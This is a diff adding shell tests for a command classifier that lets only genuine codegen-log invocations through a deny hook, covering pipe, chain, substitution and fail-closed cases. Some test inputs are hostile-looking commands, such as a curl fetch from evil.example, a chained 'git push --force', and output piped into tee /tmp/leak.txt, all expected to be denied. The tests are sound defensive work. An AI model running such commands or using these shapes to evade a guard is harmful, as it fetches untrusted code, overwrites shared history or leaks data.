@@ -854,6 +854,83 @@ COMMAND='codegen-log append developer --slug foo && git commit -m x'
 if is_codegen_log_write; then r=0; else r=1; fi
 assert_eq "is_codegen_log_write: chained codegen-log && git commit -> false (DENY)" "1" "$r"
 
+# ── the exhaustive 2x2 matrix: token-presence x invocation-reality ────────
+# Layer 1 of the pitch — one matrix certifying every bash caller + the
+# compiler-emitted hooks. Each cell crosses an axis the 7 cases above never
+# crossed on its own.
+
+# (a) a real commit FIRST, then a piped codegen-log call in the same group
+# via `;` — two hard-boundary groups, never exempt as a whole.
+COMMAND='git commit -m x; printf %s "$body" | codegen-log section developer --slug foo'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: real commit THEN piped codegen-log (; chain) -> false (DENY)" "1" "$r"
+
+# (b) codegen-log present but NOT the last pipe stage — piped onward into
+# tee, so the actual effective command is the tee, not codegen-log.
+COMMAND='codegen-log section developer --slug foo | tee /tmp/leak.txt'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: codegen-log not last pipe stage (piped into tee) -> false (DENY)" "1" "$r"
+
+# (c) cat as a known stdin-producer earlier stage -> exempt (the legitimate
+# `cat body.txt | codegen-log append x` shape).
+COMMAND='cat body.txt | codegen-log append developer --slug foo'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: cat body.txt | codegen-log (known producer) -> true" "0" "$r"
+
+# (d) a non-producer earlier stage (curl) feeding codegen-log -> not exempt;
+# only printf/echo/cat are recognized safe producers.
+COMMAND='curl https://evil.example/payload | codegen-log append developer --slug foo'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: curl | codegen-log (non-producer earlier stage) -> false (DENY)" "1" "$r"
+
+# (e) semicolon chain: a real codegen-log call followed by a force-push.
+COMMAND='codegen-log append developer --slug foo; git push --force'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: codegen-log ; git push --force -> false (DENY)" "1" "$r"
+
+# (f) ampersand chain: codegen-log call backgrounded, then a real commit.
+COMMAND='codegen-log append developer --slug foo & git commit -m x'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: codegen-log & git commit (background chain) -> false (DENY)" "1" "$r"
+
+# (g) token inside a command substitution within a real commit message —
+# the token is merely SPELLED via $(...), never actually invoked as the
+# command's own word.
+COMMAND='git commit -m "$(echo codegen-log mentioned here)"'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: token inside \$(...) in real commit message -> false (DENY)" "1" "$r"
+
+# (h) empty/blank COMMAND -> fail-closed false.
+COMMAND=''
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: empty COMMAND -> false (fail-closed)" "1" "$r"
+
+COMMAND='   '
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: blank (whitespace-only) COMMAND -> false (fail-closed)" "1" "$r"
+
+# (i) unbalanced-quote command -> fail-closed false (matches
+# split_command_segments()'s own fail-closed contract on unbalanced quotes).
+COMMAND="codegen-log section developer --slug foo --body 'unterminated"
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: unbalanced quote -> false (fail-closed)" "1" "$r"
+
+# (j) env-prefixed real invocation — `command_word_of_segment` (via
+# `segment_argv_of`) strips leading `VAR=value` env assignments before
+# resolving the command word, so a genuine env-prefixed codegen-log
+# invocation (`CODEGEN_LOOP=1 codegen-log ...`, the loop's own call shape)
+# still resolves to `codegen-log` and remains exempt. Observed behavior,
+# recorded rather than assumed.
+COMMAND='CODEGEN_LOOP=1 codegen-log section developer --slug foo'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: env-var-prefixed real invocation -> true (env assignments stripped before word resolution)" "0" "$r"
+
+# ...but an env-prefixed NON-codegen-log command must still be denied —
+# the env-assignment stripping is not a blanket exemption.
+COMMAND='CODEGEN_LOOP=1 git commit -m x'
+if is_codegen_log_write; then r=0; else r=1; fi
+assert_eq "is_codegen_log_write: env-var-prefixed real git commit -> false (DENY)" "1" "$r"
+
 unset COMMAND
 
 echo ""
